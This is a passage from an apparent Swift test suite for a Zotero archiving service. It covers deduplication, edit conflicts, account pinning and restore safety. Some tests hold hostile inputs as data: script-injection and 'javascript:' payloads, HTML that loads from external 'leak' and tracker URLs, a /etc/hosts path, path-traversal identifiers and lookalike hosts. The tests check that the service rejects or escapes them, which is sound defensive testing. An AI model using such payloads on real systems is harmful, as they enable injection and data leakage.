            let key=first.steps.first{$0.role=="analysis"}!.key!,duplicate="ZZZZ9999"
            var object=backend.objects[key]!;object["key"]=duplicate;backend.objects[duplicate]=object
            let writes=backend.requests.filter{$0.0 != "GET"}.count,count=backend.objects.count,result=try await service.archive(input)
            try require(result.status=="partial" && result.steps.first{$0.role=="analysis"}?.verified==false,"duplicate matching original marker remains ambiguous")
            try require(backend.objects.count==count && backend.requests.filter{$0.0 != "GET"}.count==writes,"ambiguous notes are not merged, overwritten or multiplied")
            passed += 2
        }
        do {
            let (service,backend,_)=try fixture();var unicode=input;unicode.bibliography.title="研究 & <script>alert(1)</script> \"MiCLA\" 'α' 😀\n第二行"
            let result=try await service.archive(unicode),key=result.steps.first{$0.role=="analysis"}!.key!,note=(backend.objects[key]!["data"] as! [String:Any])["note"] as! String
            try require(result.status=="complete" && note.contains("研究 &amp; &lt;script&gt;alert(1)&lt;/script&gt; &quot;MiCLA&quot; &#39;α&#39; 😀 第二行") && !note.contains("<script>"),"Unicode human title is escaped and whitespace normalized outside original HTML")
            captureTitle("unicode-escape",note,input.analysisHTML!,"analysis","音频研究工作台 · 个人解析 · 研究 & <script>alert(1)</script> \"MiCLA\" 'α' 😀 第二行")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture();backend.notesCorrupt=true
            let result=try await service.archive(input)
            try require(result.status=="partial" && result.steps.first{$0.role=="note"}?.verified==false,"note body readback rejects modification")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture();_ = try await service.status();backend.serverID="changed-instance"
            do { _=try await service.status();throw NSError(domain:"expected server change",code:1) } catch ZoteroService.ServiceError.serverChanged {}
            let current=try await service.status();try require(current.serverID=="changed-instance" && !current.authorized,"new server starts clean partition")
            passed += 2
        }
        do {
            let (service,backend,_) = try fixture()
            var invalid=input; invalid.pdfPath="/etc/hosts"
            do { _=try await service.archive(invalid);throw NSError(domain:"expected path rejection",code:1) } catch ZoteroService.ServiceError.invalid {}
            let link=root.appendingPathComponent("linked.pdf");try FileManager.default.createSymbolicLink(at:link,withDestinationURL:pdf)
            invalid.pdfPath=link.path
            do { _=try await service.archive(invalid);throw NSError(domain:"expected symlink rejection",code:1) } catch ZoteroService.ServiceError.invalid {}
            try require(backend.objects.isEmpty,"invalid paths never write")
            let bad=root.appendingPathComponent("bad.html");try Data("<html><img src=\"https://example.com/leak.png\"></html>".utf8).write(to:bad)
            invalid=input;invalid.guideHTMLPath=bad.path
            do { _=try await service.archive(invalid);throw NSError(domain:"expected external resource rejection",code:1) } catch ZoteroService.ServiceError.invalid {}
            passed += 3
        }
        do {
            let (service,backend,_) = try fixture()
            let original = try await service.archive(input)
            let pdfKey = original.steps.first { $0.role == "pdf" }!.key!
            let edited = Data("%PDF-1.7\nUser annotated PDF: preserve this version".utf8)
            backend.files[pdfKey] = edited
            var pdfObject = backend.objects[pdfKey]!, item = pdfObject["data"] as! [String: Any]
            item["md5"] = Insecure.MD5.hash(data: edited).map { String(format:"%02x",$0) }.joined(); pdfObject["data"] = item; backend.objects[pdfKey] = pdfObject
            let before = backend.requests.filter { $0.0 == "POST" }.count
            let conflict = try await service.archive(input,resumeID:original.archiveID)
            try require(conflict.status == "partial" && conflict.steps.first{$0.role == "pdf"}?.verified == false,"user-edited PDF is a conflict")
            try require(backend.files[pdfKey] == edited && backend.requests.filter{$0.0 == "POST"}.count == before,"changed synced PDF never overwritten")
            item["md5"] = nil; pdfObject["data"] = item; backend.objects[pdfKey] = pdfObject
            let unsynced = try await service.archive(input,resumeID:original.archiveID)
            try require(unsynced.status == "partial" && backend.files[pdfKey] == edited && backend.requests.filter{$0.0 == "POST"}.count == before,"unsynced user-edited PDF never overwritten")
            passed += 3
        }
        do {
            let (service,backend,_) = try fixture()
            let userKey = "QWER2345"
            backend.objects[userKey] = ["key":userKey,"version":4,"data":["itemType":"preprint","archiveID":"2610.27491","title":"User curated title","abstractNote":"User curated abstract","date":"2020","extra":"User private annotation","creators":[["creatorType":"author","name":"User curated author"]],"collections":["ORIG2345"],"tags":[["tag":"User tag"]]]]
            let result = try await service.archive(input)
            let after = backend.objects[userKey]!["data"] as! [String: Any]
            try require(result.status == "complete" && result.parentKey == userKey && after["title"] as? String == "User curated title" && after["extra"] as? String == "User private annotation" && after["abstractNote"] as? String == "User curated abstract","reuse preserves user bibliography fields")
            let metaKey = result.steps.first{$0.role == "source-metadata"}!.key!
            let source = try JSONSerialization.jsonObject(with: backend.files[metaKey]!) as! [String: Any]
            let bibliography = source["bibliography"] as! [String: Any]
            try require(source["identity"] as? String == input.identity && bibliography["title"] as? String == input.bibliography.title && bibliography["abstract"] as? String == input.bibliography.abstract && bibliography["date"] as? String == input.bibliography.date && bibliography["extra"] as? String == input.bibliography.extra,"original source metadata stored fully and read back as real JSON file")
            let count = backend.objects.count
            let repeatResult = try await service.archive(input)
            try require(repeatResult.status == "complete" && backend.objects.count == count,"metadata preservation does not add duplicate child on repeated archive")
            passed += 3
        }
        do {
            let (service,backend,_) = try fixture()
            var conference = input; conference.identity = "conference:interspeech:2026:conference-paper-id:test26-interspeech"
            conference.bibliography.url = "https://www.isca-archive.org/interspeech_2026/test26_interspeech.html"
            let first = try await service.archive(conference), second = try await service.archive(conference)
            try require(first.status == "complete" && first.parentKey == second.parentKey && backend.objects.count == 6,"conference exact managed identity dedup")
            let parent = backend.objects[first.parentKey!]!["data"] as! [String: Any]
            try require(parent["itemType"] as? String == "conferencePaper" && parent["archiveID"] == nil,"conference never invents arxiv")
            passed += 2
        }
        do {
            let (service,backend,_) = try fixture()
            var page = input; page.identity = "page:/audio-paper-digest-blog/posts/unknown-paper/"
            page.bibliography.url = "https://nanless.github.io/audio-paper-digest-blog/posts/unknown-paper/"
            let first = try await service.archive(page), second = try await service.archive(page)
            try require(first.status == "complete" && first.parentKey == second.parentKey,"page fallback dedup exact managed marker")
            let parent = backend.objects[first.parentKey!]!["data"] as! [String: Any]
            try require(parent["itemType"] as? String == "webpage" && (parent["extra"] as? String ?? "").contains("original-paper-identity-unverified"),"fallback stays unverified webpage")
            passed += 2
        }
        do {
            let (service,backend,_) = try fixture()
            for malicious in ["<html><img src=https://example.com/leak></html>","<html><style>a{background:url(relative.png)}</style></html>","<html><a href=\"jav&#x61;script:alert(1)\">click</a></html>","<html><style>@import 'https://example.com/a.css'</style></html>","<html><svg><image href=\"https://example.org/tracker.png\"/></svg></html>","<html><svg><use xlink:href=\"https://example.org/external.svg#shape\"/></svg></html>","<html><svg><use xlink:href=\"#safe\" href=\"https://example.org/unsafe.svg#shape\"/></svg></html>","<html><svg><image title=\">\" href=\"https://example.org/remote.png\"/></svg></html>","<html><svg><svg:image title=\">\" href=\"https://example.org/remote.png\"/></svg></html>"] {
                let path=root.appendingPathComponent("unsafe.html"); try Data(malicious.utf8).write(to:path)
                var bad=input;bad.guideHTMLPath=path.path
                do { _=try await service.archive(bad);throw NSError(domain:"expected unsafe html refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            }
            try require(backend.objects.isEmpty,"unsafe HTML cases reject before any write")
            passed += 9
        }
        do {
            let (service,backend,_) = try fixture()
            var journal = input; journal.identity = "doi:10.1000/fixture-journal"
            journal.bibliography.doi = "10.1000/fixture-journal"; journal.bibliography.url = "https://doi.org/10.1000/fixture-journal"
            journal.bibliography.fields = ["itemType":"journalArticle", "publicationTitle":"Explicit fixture journal", "volume":"12", "issue":"3", "pages":"14–19", "language":"en"]
            let result = try await service.archive(journal)
            let data = backend.objects[result.parentKey!]!["data"] as! [String:Any]
            try require(result.status == "complete" && data["itemType"] as? String == "journalArticle" && data["publicationTitle"] as? String == "Explicit fixture journal" && data["volume"] as? String == "12" && data["archiveID"] == nil && data["repository"] == nil, "explicit DOI journal type and fields, no invented arxiv")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture()
            var published = input; published.bibliography.fields = ["itemType":"journalArticle", "publicationTitle":"Source stated journal"]
            let result = try await service.archive(published)
            let data = backend.objects[result.parentKey!]!["data"] as! [String:Any]
            try require(result.status == "complete" && data["itemType"] as? String == "journalArticle" && data["archiveID"] == nil && ZoteroService.matchesIdentity(published.identity,data:data), "arxiv identity can carry explicit published type without unsupported archive fields")
            passed += 1
        }
        do {
            let (service,backend,_) = try fixture()
            var unknown = input; unknown.identity = "doi:10.1000/unknown"; unknown.bibliography.doi = "10.1000/unknown"
            for fields: [String:String]? in [nil, ["itemType":"book"], ["itemType":"journalArticle", "proceedingsTitle":"incompatible"], ["itemType":"conferencePaper", "publicationTitle":"incompatible"], ["itemType":"preprint", "guessedFact":"unknown"]] {
                unknown.bibliography.fields = fields
                do { _=try await service.archive(unknown); throw NSError(domain:"expected type or field rejection",code:1) } catch ZoteroService.ServiceError.invalid {}
                try require(backend.objects.isEmpty && backend.collections.isEmpty, "unknown/incompatible source fields reject before writes")
                passed += 1
            }
        }
        try require(!ZoteroService.validIdentity("page:/audio-paper-digest-blog/posts/test/",sourceURL:"https://example.com/audio-paper-digest-blog/posts/test/"),"fallback refuses foreign origin")
        try require(!ZoteroService.validIdentity("page:/audio-paper-digest-blog/posts/test/",sourceURL:"https://nanless.github.io/audio-paper-digest-blog/posts/another/"),"fallback canonical path exact")
        try require(!ZoteroService.matchesIdentity("conference:icml:2026:forum:ABC",data:["title":"conference:icml:2026:forum:ABC","extra":"cites conference:icml:2026:forum:ABC"]),"conference title/mention never identity")
        try require(!ZoteroService.matchesIdentity("page:/audio-paper-digest-blog/posts/test/",data:["url":"https://nanless.github.io/audio-paper-digest-blog/posts/test/"]),"page URL alone is not managed identity")
        try require(!ZoteroService.matchesIdentity("conference:icml:2026:forum:ABC",data:["extra":"PaperDigest-ID: conference:icml:2026:forum:ABCD"]),"conference prefix mismatch")
        passed += 5
        try require(ZoteroService.matchesIdentity("arxiv:2610.27491v1",data:["url":"https://arxiv.org/abs/2610.27491v2"]),"arxiv versions share parent identity")
        try require(!ZoteroService.matchesIdentity("arxiv:2610.27491v1",data:["archiveID":"2610.274910"]),"ID prefix is not identity")
        try require(ZoteroService.matchesIdentity("doi:10.1000/test",data:["DOI":"https://doi.org/10.1000/TEST"]),"DOI normalization")
        try require(!ZoteroService.matchesIdentity("arxiv:2610.27491v1",data:["extra":"This different paper cites 2610.27491 in references"]),"cited ID is not parent identity")
        try require(!ZoteroService.matchesIdentity("arxiv:2610.27491v1",data:["url":"https://example.com/paper/2610.27491"]),"foreign URL is not arxiv identity")
        try require(ZoteroService.matchesIdentity("arxiv:2610.27491v1",data:["extra":"arXiv: 2610.27491v2 [cs.SD]"]),"explicit arxiv extra field")
        passed += 6
        for identifier in ["math/0101001", "math/0101001v1", "hep-th/9901001v12", "math.GT/0301001v2", "cs.SE/0601001v1"] {
            try require(ZoteroService.validIdentity("arxiv:"+identifier,sourceURL:"https://arxiv.org/abs/"+identifier),"canonical legacy identifier: "+identifier)
            passed += 1
        }
        for identifier in ["Math/0101001v1", "math.gt/0301001", "mAth.GT/0301001", "math/0101001V1", "math/0101001v0", "math/0101001v01", "math/0101001v1/extra", "math/0101001v1.pdf", "math/0101001?x=1", "math/0101001#x", "math//0101001", "math/../0101001", "../math/0101001", "math%2F0101001", "math\\0101001", "math/01010011", "math/0101001\n", "math/0113001", "math..GT/0101001"] {
            let (service,backend,_) = try fixture()
            var invalid = input; invalid.identity = "arxiv:"+identifier
            try require(!ZoteroService.validIdentity(invalid.identity,sourceURL:invalid.bibliography.url),"reject unsafe legacy identity: "+identifier)
            do { _=try await service.archive(invalid); throw NSError(domain:"expected legacy identity rejection",code:1) } catch ZoteroService.ServiceError.invalid {}
            try require(backend.requests.allSatisfy{$0.0 == "GET"} && backend.objects.isEmpty && backend.collections.isEmpty,"legacy invalid input cannot create collection/items or upload")
            passed += 1
        }
        try require(ZoteroService.matchesIdentity("arxiv:math/0101001v1",data:["url":"https://arxiv.org/pdf/math/0101001v2.pdf"]),"old versions match exact official PDF URL")
        try require(ZoteroService.matchesIdentity("arxiv:math.GT/0301001v1",data:["extra":"arXiv: math.GT/0301001v2 [math.GT]"]),"canonical class case matches exact Extra")
        for data: [String:Any] in [["archiveID":"Math/0101001v1"], ["archiveID":"math/01010011"], ["extra":"arXiv: Math/0101001v1"], ["url":"https://arxiv.org/abs/math/0101001v1/extra"], ["url":"https://arxiv.org/abs/math%2F0101001v1"], ["url":"https://arxiv.org/abs/math/0101001v1?different=paper"], ["url":"https://arxiv.org@example.com/abs/math/0101001v1"]] {
            try require(!ZoteroService.matchesIdentity("arxiv:math/0101001v1",data:data),"legacy dedup refuses near identifier/unsafe URL")
            passed += 1
        }
        passed += 2
        do {
            let (service,backend,_) = try fixture()
            let oldPDF = root.appendingPathComponent("legacy-version-two.pdf")
            try Data("%PDF-1.7\nlegacy version two mock bytes, not scientific source".utf8).write(to:oldPDF)
            var old = input; old.identity = "arxiv:math/0101001v1"; old.bibliography.title = "Legacy identity mock fixture"
            old.bibliography.url = "https://arxiv.org/abs/math/0101001v1"
            let first = try await service.archive(old)
            var newer = old; newer.identity = "arxiv:math/0101001v2"; newer.bibliography.url = "https://arxiv.org/abs/math/0101001v2"; newer.pdfPath = oldPDF.path
            let second = try await service.archive(newer)
            try require(first.status == "complete" && second.status == "complete" && first.parentKey == second.parentKey && backend.objects.count == 8,"legacy versions reuse one parent while preserving distinct PDF and complete original metadata")
            let parent = backend.objects[first.parentKey!]!["data"] as! [String:Any]
            try require(parent["archiveID"] as? String == "math/0101001v1" && parent["url"] as? String == old.bibliography.url,"legacy new version preserves original parent/user bibliography")
            let firstPDF = first.steps.first{$0.role == "pdf"}!.key!, secondPDF = second.steps.first{$0.role == "pdf"}!.key!
            let firstSource = first.steps.first{$0.role == "source-metadata"}!.key!, secondSource = second.steps.first{$0.role == "source-metadata"}!.key!
            try require(firstPDF != secondPDF && backend.files[firstPDF] == (try Data(contentsOf:pdf)) && backend.files[secondPDF] == (try Data(contentsOf:oldPDF)),"legacy versions keep distinct original PDF bytes")
            for key in [firstPDF,secondPDF] {
                let attachment = backend.objects[key]!["data"] as! [String:Any]
                try require(attachment["filename"] as? String == "paper.pdf" && attachment["parentItem"] as? String == first.parentKey,"legacy slash never becomes local upload filename/path")
            }
            let firstMetadata = try JSONSerialization.jsonObject(with:backend.files[firstSource]!) as! [String:Any]
            let secondMetadata = try JSONSerialization.jsonObject(with:backend.files[secondSource]!) as! [String:Any]
            try require(firstSource != secondSource && firstMetadata["identity"] as? String == old.identity && secondMetadata["identity"] as? String == newer.identity,"legacy versioned scientific identity stays complete in separate metadata attachments")
            let writes = backend.requests.filter{$0.0 != "GET"}.count
            let duplicate = try await service.archive(newer), resumed = try await service.archive(old,resumeID:first.archiveID)
            try require(duplicate.parentKey == first.parentKey && resumed.status == "complete" && backend.objects.count == 8 && backend.requests.filter{$0.0 != "GET"}.count == writes,"legacy repeat and original-version resume add no duplicate or upload")
            passed += 6
        }
        do {
            let old = root.appendingPathComponent("support-old",isDirectory:true)
            try FileManager.default.createDirectory(at:old,withIntermediateDirectories:false)
            _=try DesktopStore(directory:old)
            let oldPDF=old.appendingPathComponent("paper.pdf"),oldHTML=old.appendingPathComponent("guide.html")
            try Data(contentsOf:pdf).write(to:oldPDF);try Data(contentsOf:html).write(to:oldHTML)
            var request=input;request.pdfPath=oldPDF.path;request.guideHTMLPath=oldHTML.path
            let config=URLSessionConfiguration.ephemeral;config.protocolClasses=[ZoteroMockProtocol.self]
            let backend=MockZotero(storage:root),credentials=MemoryCredentialStore();try credentials.seed()
            ZoteroMockProtocol.handler={try backend.response($0)}
            let firstService=ZoteroService(dataDirectory:old,session:URLSession(configuration:config),credentialStore:credentials)
            backend.failPDFUploadOnce=true
            let first=try await firstService.archive(request)
            try require(first.status=="partial","cross-directory fixture is genuinely partial")
            let oldJournal=old.appendingPathComponent("zotero-archives/"+first.archiveID+".json")
            let originalBytes=try Data(contentsOf:oldJournal)
            let original=try JSONSerialization.jsonObject(with:originalBytes) as! [String:Any]
            let hashes=original["materialSHA256"] as? [String:String] ?? [:]
            try require(hashes["pdf"]==ZoteroService.sha256(try Data(contentsOf:oldPDF)) && hashes["guide"]==ZoteroService.sha256(try Data(contentsOf:oldHTML)),"journal records original material SHA by role")
            let staged=try BackupCodec.stage(BackupCodec.collect(sourceDirectory:old),parentDirectory:root)
            let restored=ZoteroService(dataDirectory:staged.stageDirectory,session:URLSession(configuration:config),credentialStore:credentials)
            let objectCount=backend.objects.count
            let resumed=try await restored.archive(request,resumeID:first.archiveID)
            try require(resumed.status=="complete" && resumed.parentKey==first.parentKey && backend.objects.count==objectCount,"restored appSupport resumes same journal/server without duplicating completed remote materials")
            let newJournal=staged.stageDirectory.appendingPathComponent("zotero-archives/"+first.archiveID+".json")
            let after=try JSONSerialization.jsonObject(with:Data(contentsOf:newJournal)) as! [String:Any]
            let oldRequest=original["request"] as! [String:Any],newRequest=after["request"] as! [String:Any]
            try require(original["fingerprint"] as? String==after["fingerprint"] as? String && oldRequest["pdfPath"] as? String==newRequest["pdfPath"] as? String && oldRequest["guideHTMLPath"] as? String==newRequest["guideHTMLPath"] as? String && (try Data(contentsOf:oldJournal))==originalBytes,"relocation never rewrites original request paths/fingerprint/history")
            passed += 3
            let writeCount=backend.requests.filter{$0.0 != "GET"}.count
            let currentPDF=staged.stageDirectory.appendingPathComponent("paper.pdf"),savedPDF=try Data(contentsOf:currentPDF)
            try Data("%PDF-1.7 changed after restore".utf8).write(to:currentPDF)
            do { _=try await restored.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected restored material hash refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try savedPDF.write(to:currentPDF)
            try require(backend.requests.filter{$0.0 != "GET"}.count==writeCount,"changed relocated bytes never dispatch writes")
            let map=staged.stageDirectory.appendingPathComponent(PrivateStoragePaths.aliasesFilename),savedMap=try Data(contentsOf:map)
            try FileManager.default.removeItem(at:map)
            do { _=try await restored.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected absent root map refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try Data("{\"contract\":\"paperdigest-storage-aliases-v1\",\"roots\":[\"/\"]}".utf8).write(to:map)
            do { _=try await restored.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected root escape refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try savedMap.write(to:map)
            try FileManager.default.removeItem(at:currentPDF);try FileManager.default.createSymbolicLink(at:currentPDF,withDestinationURL:oldPDF)
            do { _=try await restored.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected alias symlink refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try FileManager.default.removeItem(at:currentPDF);try savedPDF.write(to:currentPDF)
            var changed=request;changed.bibliography.title="changed request cannot reuse old fingerprint"
            do { _=try await restored.archive(changed,resumeID:first.archiveID);throw NSError(domain:"expected fingerprint refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try require(backend.requests.filter{$0.0 != "GET"}.count==writeCount,"root map and mutable request never grant write eligibility")
            passed += 5
            // Backward-format fixture: removing the optional field does not mint old hashes.
            var legacy=original;legacy["materialSHA256"]=nil
            try JSONSerialization.data(withJSONObject:legacy,options:[.sortedKeys]).write(to:oldJournal)
            let sameDirectory=try await firstService.archive(request,resumeID:first.archiveID)
            try require(sameDirectory.status=="complete","legacy checkpoint still resumes at original directory under original fingerprint")
            let legacyStage=try BackupCodec.stage(BackupCodec.collect(sourceDirectory:old),parentDirectory:root)
            let legacyService=ZoteroService(dataDirectory:legacyStage.stageDirectory,session:URLSession(configuration:config),credentialStore:credentials)
            let writesBeforeLegacy=backend.requests.filter{$0.0 != "GET"}.count
            do { _=try await legacyService.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected legacy alias missing SHA refusal",code:1) } catch ZoteroService.ServiceError.invalid {}
            try require(backend.requests.filter{$0.0 != "GET"}.count==writesBeforeLegacy,"missing old SHA cannot be supplied by a root map")
            passed += 2
            backend.serverID="other-server"
            let foreign=ZoteroService(dataDirectory:staged.stageDirectory,session:URLSession(configuration:config),credentialStore:credentials)
            let readsBeforeForeign=credentials.loads
            do { _=try await foreign.archive(request,resumeID:first.archiveID);throw NSError(domain:"expected changed server source refusal",code:1) } catch ZoteroService.ServiceError.serverChanged {}
            try require(backend.requests.filter{$0.0 != "GET"}.count==writesBeforeLegacy && credentials.loads==readsBeforeForeign,"restore refuses foreign journal before reading another server credential")
            passed += 1
        }
        do {
            let (service,backend,credentials)=try fixture()
            let a="TARG2222",b="TARG3333"
            backend.collections=[a:["key":a,"version":1,"data":["name":"Controlled original target"]],b:["key":b,"version":1,"data":["name":"Controlled other target"]]]
            var request=input;request.collectionKey=a;request.collectionName=nil
            let first=try await service.archive(request)
            try require(first.status=="complete","original exact target must really archive before testing retarget rejection")
            let journal=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json"),before=try Data(contentsOf:journal),objects=try JSONSerialization.data(withJSONObject:backend.objects,options:[.sortedKeys]),files=backend.files
            let writes=backend.requests.filter{$0.0 != "GET"}.count,loads=credentials.loads
            var retarget=request;retarget.collectionKey=b
            do{_=try await service.archive(retarget,resumeID:first.archiveID);throw NSError(domain:"expected retarget rejection",code:1)}catch ZoteroService.ServiceError.invalid{}
            try require(try Data(contentsOf:journal)==before && JSONSerialization.data(withJSONObject:backend.objects,options:[.sortedKeys])==objects && backend.files==files,"changed collection must preserve original journal, parent/role objects and original files exactly")
            try require(backend.requests.filter{$0.0 != "GET"}.count==writes && credentials.loads==loads,"retarget old journal cannot write or load a new grant")
            let parent=backend.objects[first.parentKey!]!["data"] as! [String:Any]
            try require(parent["collections"] as? [String]==[a],"old mapping must remain only its original collection, not the available other/default collection")
            print("PASS changed collection rejects old journal before write and preserves original mapping")
            passed += 1
        }
        do {
            let (service,backend,_)=try fixture(),a="TARG2222",b="TARG3333"
            let originalCollection:[String:Any]=["key":a,"version":1,"data":["name":"Controlled original target"]]
            backend.collections=[a:originalCollection,b:["key":b,"version":1,"data":["name":"Controlled other target"]]]
            var request=input;request.collectionKey=a;request.collectionName=nil
            let first=try await service.archive(request)
            try require(first.status=="complete","original target must be a real completed normal archive")
            let journal=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json"),before=try Data(contentsOf:journal),objects=try JSONSerialization.data(withJSONObject:backend.objects,options:[.sortedKeys]),files=backend.files,writes=backend.requests.filter{$0.0 != "GET"}.count
            func mapping(_ data:Data)throws->Data{
                let j=try JSONSerialization.jsonObject(with:data) as! [String:Any]
                let steps=(j["steps"] as! [[String:Any]]).map{["role":$0["role"]!,"key":$0["key"] ?? NSNull()]}
                return try JSONSerialization.data(withJSONObject:["serverID":j["serverID"]!,"fingerprint":j["fingerprint"]!,"request":j["request"]!,"collectionKey":j["collectionKey"]!,"parentKey":j["parentKey"]!,"steps":steps],options:[.sortedKeys])
            }
            let bound=try mapping(before)
            backend.collections[a]=nil
            let absent=try await service.archive(request,resumeID:first.archiveID)
            try require(absent.status=="partial" && absent.archiveID==first.archiveID && absent.parentKey==first.parentKey && absent.steps.first{$0.role=="bibliography"}?.verified==false,"removed old target cannot keep a green completion")
            try require(try mapping(Data(contentsOf:journal))==bound && backend.requests.filter{$0.0 != "GET"}.count==writes,"missing target cannot remap to remaining other collection or write")
            backend.collections[a]=originalCollection
            var forbiddenReads=0
            ZoteroMockProtocol.handler={r in
                if r.httpMethod=="GET",r.url?.path=="/api/users/0/collections"{forbiddenReads+=1;backend.requests.append(("GET","/api/users/0/collections"));return(403,["X-Zotero-Version":backend.version,"Zotero-API-Version":"3","Zotero-Server-ID":backend.serverID,"Content-Type":"application/json"],Data("{}".utf8))}
                return try backend.response(r)
            }
            let denied=try await service.archive(request,resumeID:first.archiveID)
            try require(forbiddenReads==1 && denied.status=="partial" && denied.steps.first{$0.role=="bibliography"}?.error?.contains("403")==true,"actual controlled HTTP403 remains explicit incomplete permission failure")
            try require(try mapping(Data(contentsOf:journal))==bound && JSONSerialization.data(withJSONObject:backend.objects,options:[.sortedKeys])==objects && backend.files==files && backend.requests.filter{$0.0 != "GET"}.count==writes,"forbidden old target must preserve original keys/source/parent/bytes and never use default target")
            ZoteroMockProtocol.handler={try backend.response($0)}
            let recovered=try await service.archive(request,resumeID:first.archiveID)
            try require(recovered.status=="complete" && recovered.archiveID==first.archiveID && recovered.parentKey==first.parentKey && mapping(Data(contentsOf:journal))==bound && backend.requests.filter{$0.0 != "GET"}.count==writes,"normal reauthorization/readback of available original target must reuse original mapping without any new object/write")
            print("PASS missing or HTTP403 old target preserves exact mapping then resumes original target readback")
            passed += 1
        }
        // Account ownership is tested against the mock's real wire-path gate,
        // not its canonical counters used by the pre-existing assertions.
        do {
            let (service,backend,credentials)=try fixture()
            let first=try await service.archive(input)
            let file=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json")
            let original=try Data(contentsOf:file),summary=file.deletingPathExtension().appendingPathExtension("summary.json"),summaryBytes=try Data(contentsOf:summary)
            let j=try JSONSerialization.jsonObject(with:original) as! [String:Any]
            let binding=j["personalLibraryBinding"] as? [String:Any]
            try require(first.status=="complete" && binding?["serverID"] as? String==backend.serverID && binding?["userID"] as? Int==42,"normal new archive records positive personal account from an empty real collection response's alternate header")
            let personalWrites=backend.wireRequests.filter{$0.0 != "GET" && $0.1.hasPrefix("/api/users/")}
            try require(!personalWrites.isEmpty && personalWrites.allSatisfy{$0.1.hasPrefix("/api/users/42/")},"every actual personal mutation is pinned to positive account42, never users0")
            let count=backend.wireRequests.count,loads=credentials.loads,objects=try backend.data(backend.objects),files=backend.files
            backend.userID=43
            do{_=try await service.archive(input,resumeID:first.archiveID);throw NSError(domain:"expected account rejection",code:1)}catch ZoteroService.ServiceError.accountChanged{}
            try require(credentials.loads==loads && backend.wireRequests.dropFirst(count).allSatisfy{$0.0=="GET"} && backend.files==files && backend.data(backend.objects)==objects,"same instance changed account refuses before credential load and any write")
            try require(try Data(contentsOf:file)==original && Data(contentsOf:summary)==summaryBytes,"account rejection preserves original bound journal/summary bytes and all old keys/fingerprint")
            backend.userID=42
            let repeated=try await service.archive(input,resumeID:first.archiveID)
            try require(repeated.status=="complete" && repeated.archiveID==first.archiveID && backend.wireRequests.filter{$0.0 != "GET" && $0.1.hasPrefix("/api/users/")}.count==personalWrites.count,"return to actual original account permits normal repeated readback without creating replacement objects")
            passed += 5
        }
        do {
            let (service,backend,_)=try fixture()
            backend.beforePersonalWrite={backend.userID=43}
            let result=try await service.archive(input)
            try require(result.status=="partial" && result.parentKey==nil && backend.collections.isEmpty && backend.objects.isEmpty,"account switch immediately before first actual collection mutation is rejected by official-style positive route gate")
            try require(backend.wireRequests.contains{$0.0=="POST" && $0.1=="/api/users/42/collections"} && !backend.wireRequests.contains{$0.0 != "GET" && $0.1.hasPrefix("/api/users/43/")},"TOCTOU does not follow dynamic users0 or rewrite to the new account")
            passed += 2
        }
        do {
            let (service,backend,_)=try fixture()
            backend.changeAccountDuringRawUpload=true
            let result=try await service.archive(input)
            let key=result.steps.first{$0.role=="source-metadata"}?.key
            try require(result.status=="partial" && key != nil && backend.stagedFiles[key!] != nil && backend.files[key!]==nil,"actual binary token only stages fixed item's bytes when the account changes during upload")
            try require(backend.uploads.values.contains(key!) && backend.wireRequests.contains{$0.0=="POST" && $0.1=="/api/users/42/items/"+key!+"/file"} && backend.userID==43,"final file registration remains pinned to account42 and the original token's exact item")
            try require(backend.files.isEmpty && result.steps.first{$0.role=="source-metadata"}?.verified==false && !backend.wireRequests.contains{$0.1.hasPrefix("/api/users/43/")},"account mismatch never registers staged bytes or verifies a role in the wrong account")
            passed += 3
        }
        for kind in ["zero","missing","boolean","fraction","group","conflict","bad-link","mixed","huge"] {
            let (service,backend,credentials)=try fixture()
            if kind=="zero"{backend.userID=0}
            ZoteroMockProtocol.handler={request in
                let response=try backend.response(request)
                guard request.url?.path=="/api/users/0/collections",request.url?.query=="limit=1" else{return response}
                var headers=response.1
                var library:[String:Any]=["type":"user","id":42]
                switch kind {
                case "zero": return response
                case "missing":headers["Link"]=nil;return(response.0,headers,Data("[]".utf8))
                case "boolean":library["id"]=true
                case "fraction":library["id"]=42.5
                case "group":library["type"]="group"
                case "conflict":library["id"]=43
                case "bad-link":headers["Link"]="<https://www.zotero.org.evil.invalid/users/42/collections>; rel=\"alternate\""
                case "huge":library["id"]=9_007_199_254_740_992 as Int64
                default:break
                }
                let object:[String:Any]=["key":"TARG2222","library":library,"data":["name":"identity fixture"]]
                let list=kind=="mixed" ? [object,["key":"TARG3333","library":["type":"user","id":43],"data":["name":"other"]]] : [object]
                return(response.0,headers,try backend.data(list))
            }
            var rejected=false
            do{_=try await service.archive(input)}catch let error as ZoteroService.ServiceError{switch error{case .accountUnidentified,.verification:rejected=true;default:break}}
            try require(rejected && credentials.loads==0 && backend.wireRequests.allSatisfy{$0.0=="GET"} && backend.objects.isEmpty,"\(kind) cannot mint an account binding, load a credential or write")
            passed += 1
        }
        do {
            let (service,backend,credentials)=try fixture()
            backend.validGeneratedKeys=true
            let first=try await service.archive(input)
            let file=root.appendingPathComponent("zotero-archives/"+first.archiveID+".json"),summary=file.deletingPathExtension().appendingPathExtension("summary.json")
            // Normal completed archive first; omit only the new optional field
            // to replay the prior on-disk schema. No success journal is invented.
            var old=try JSONSerialization.jsonObject(with:Data(contentsOf:file)) as! [String:Any]
            old.removeValue(forKey:"personalLibraryBinding")
            try backend.data(old).write(to:file)
            let original=try Data(contentsOf:file),summaryBytes=try Data(contentsOf:summary),beforeCount=backend.wireRequests.count,loads=credentials.loads
            credentials.failLoads=true
            let readback=try await service.archive(input,resumeID:first.archiveID)
            try require(readback.readOnly==true && readback.status=="partial" && !readback.retryable && readback.steps.allSatisfy(\.verified) && readback.warning?.contains("未绑定")==true,"legacy complete has explicitly read-only result, not a newly completed archive or reconstructed account")
